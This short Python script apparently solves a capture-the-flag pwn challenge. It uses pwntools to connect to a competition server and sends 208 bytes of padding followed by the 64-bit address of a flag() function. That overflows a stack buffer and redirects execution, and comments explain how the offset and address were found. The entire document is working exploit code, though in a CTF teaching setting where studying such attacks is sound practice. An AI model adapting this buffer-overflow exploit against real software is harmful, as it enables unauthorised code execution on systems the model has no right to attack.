from pwn import * 
connection = remote('pwn.hsctf.com', 5002)
#through fuzzing found buffer
offset = 208
#through objdump -d we found the address of flag() as 00000000004011d5 and know the machine is 64 bit
address = p64(0x000004011d5)
#perform the bufferoverflow itself
connection.sendline('a'*offset + address)
connection.interactive()



